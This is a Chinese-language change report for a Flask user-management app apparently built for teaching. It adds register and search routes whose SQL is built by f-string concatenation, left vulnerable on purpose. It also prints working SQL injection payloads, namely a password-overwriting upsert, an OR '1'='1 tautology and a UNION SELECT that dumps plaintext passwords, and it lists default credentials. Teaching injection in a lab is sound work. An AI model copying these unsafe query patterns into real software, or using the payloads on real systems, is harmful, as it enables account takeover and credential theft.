# 功能新增与修改报告

## 项目信息

- 项目名称：用户管理系统（Flask）
- 仓库地址：https://github.com/j04783993-prog/qs
- 修改时间：2026-07-19
- 修改人员：Jerry

---

## 一、新增功能概述

本次在保留原有登录功能不变的前提下，新增以下两项功能：

1. **用户注册功能**（`/register`）
2. **用户搜索功能**（`/search`）

同时引入了 **SQLite** 数据库作为用户信息的持久化存储。

---

## 二、详细修改内容

### 1. 数据库初始化（`app.py`）

- 新增导入 `sqlite3` 和 `os`。
- 新增 `init_db()` 函数，在应用启动时自动调用。
- 数据库文件位于 `data/users.db`。
- 创建 `users` 表，字段如下：

| 字段 | 类型 | 说明 |
|------|------|------|
| `id` | INTEGER PRIMARY KEY AUTOINCREMENT | 自增主键 |
| `username` | TEXT UNIQUE NOT NULL | 用户名，唯一 |
| `password` | TEXT NOT NULL | 密码 |
| `email` | TEXT NOT NULL | 邮箱 |
| `phone` | TEXT NOT NULL | 手机号 |

- 默认插入两个用户：
  - `admin` / `admin123`
  - `alice` / `alice2025`
- 使用 `INSERT OR IGNORE` 防止重复启动时重复插入。

### 2. 注册功能（`/register`）

- 支持 `GET` 和 `POST` 方法。
- GET 请求渲染 `register.html` 注册页面。
- POST 请求接收表单字段：`username`、`password`、`email`、`phone`。
- 使用 **f-string 字符串拼接** 构造 SQL 插入语句：

```python
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
```

- 注册成功后跳转到登录页，并提示 "注册成功，请登录"。
- 用户名已存在时提示 "用户名已存在"。
- 后台打印执行的 SQL 语句到控制台。

### 3. 搜索功能（`/search`）

- 支持 `GET` 方法。
- 通过 URL 参数 `keyword` 接收搜索关键词。
- 使用 **f-string 字符串拼接** 构造 SQL 查询语句：

```python
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
```

- 搜索结果以表格形式展示在首页，包含字段：ID、用户名、邮箱、手机。
- 如果有关键词但没有结果，显示 "无搜索结果"。
- 后台打印执行的 SQL 语句到控制台。

### 4. 新增模板 `templates/register.html`

- 继承 `base.html`。
- 包含用户名、密码、邮箱、手机号输入框和注册按钮。
- 表单中包含 CSRF 隐藏字段。

### 5. 修改模板 `templates/index.html`

- 在已登录状态下新增搜索卡片。
- 包含搜索输入框和搜索按钮。
- 搜索结果以表格形式展示在搜索框下方。
- 无结果时显示 "无搜索结果"。

### 6. 修改模板 `templates/base.html`

- 在导航栏未登录状态下新增 "注册" 链接。

### 7. 修改样式 `static/css/style.css`

- 新增搜索表单样式（`.search-form`、`.search-group`）。
- 新增搜索结果表格样式（`.search-table`、`.search-table th`、`.search-table td`）。
- 新增无结果提示样式（`.no-results`）。

### 8. 更新 `.gitignore`

- 新增忽略规则，避免将运行时生成的数据库文件和目录提交到 Git：

```gitignore
# Database
data/
*.db
```

---

## 三、安全说明

> ⚠️ **警告**：本次新增的注册和搜索功能中，SQL 语句使用 f-string 字符串拼接，并且未对用户输入进行过滤或转义。这是**故意为之**，用于在教学环境中观察 SQL 注入效果。
>
> 请勿将本代码直接用于生产环境。生产环境中应使用参数化查询（如 `cursor.execute("... WHERE username = ?", (username,))`）或 ORM 框架。

### SQL 注入观察示例

#### 注册接口注入

在注册表单的用户名处输入：

```text
admin', 'pass', 'a@b.com', '123') ON CONFLICT(username) DO UPDATE SET password='hacked'--
```

控制台将打印拼接后的完整 SQL，可观察到注入效果。

#### 搜索接口注入

在搜索框中输入：

```text
%' OR '1'='1
```

拼接后的 SQL 将变为：

```sql
SELECT * FROM users WHERE username LIKE '%%' OR '1'='1%' OR email LIKE '%%' OR '1'='1%'
```

这将返回 `users` 表中所有记录。

或者使用联合查询注入：

```text
%' UNION SELECT id, username, password, phone FROM users --
```

可在搜索结果中直接查看其他用户的密码明文。

---

## 四、验证方式

1. 启动应用：

```bash
cd /opt/Class01
python3 app.py
```

2. 访问注册页面：

```text
http://127.0.0.1:5000/register
```

3. 注册一个新用户，观察控制台打印的 SQL。

4. 使用默认账号登录：
   - 用户名：`admin`
   - 密码：`ChangeMe!Admin2025#`

5. 在首页搜索框中输入关键词或注入 Payload，观察搜索结果和控制台 SQL 输出。

---

## 五、文件变更清单

| 文件 | 变更类型 | 说明 |
|------|---------|------|
| `app.py` | 修改 | 新增数据库初始化、注册、搜索路由 |
| `templates/register.html` | 新增 | 注册页面 |
| `templates/index.html` | 修改 | 新增搜索框和结果表格 |
| `templates/base.html` | 修改 | 新增注册导航链接 |
| `static/css/style.css` | 修改 | 新增搜索相关样式 |
| `.gitignore` | 修改 | 忽略数据库文件和目录 |
| `MODIFICATION_REPORT.md` | 新增 | 本报告 |

---

## 六、后续建议

1. **修复 SQL 注入**：将 f-string 拼接改为参数化查询。
2. **密码哈希**：数据库中的注册密码应使用 `werkzeug.security.generate_password_hash` 哈希后存储。
3. **输入校验**：对用户输入进行长度、格式等校验。
4. **登录与数据库同步**：当前登录仍使用内存字典，可考虑改为从 SQLite 验证。
5. **添加测试用例**：为注册、搜索功能编写单元测试。
